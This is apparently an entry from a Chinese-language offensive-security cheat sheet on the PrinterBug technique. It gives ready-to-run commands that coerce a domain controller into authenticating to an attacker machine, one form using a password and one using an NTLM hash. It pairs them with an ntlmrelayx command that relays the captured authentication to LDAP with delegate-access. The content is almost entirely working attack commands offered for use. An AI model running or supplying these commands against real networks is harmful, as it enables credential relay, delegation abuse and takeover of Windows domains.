### PrinterBug

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `强制认证` `PrintSpooler` `中继` |

## PrinterBug 强制触发认证

### 强制域控向攻击机发起认证
```bash
bash printerbug.sh contoso.com/user1:Pass123 192.168.1.10 192.168.1.100
```

### 使用 NTLM Hash 认证
```bash
bash printerbug.sh contoso.com/user1@192.168.1.10 192.168.1.100 -hashes :31d6cfe0d16ae931...
```

### 配合 NTLMRelayx 捕获请求
```bash
ntlmrelayx.py -t ldap://192.168.1.10 --delegate-access
```

- ✓ 利用 Print Spooler 服务特性
- ✓ 强制目标机器账户发起认证
- 常配合非约束委派或中继攻击使用
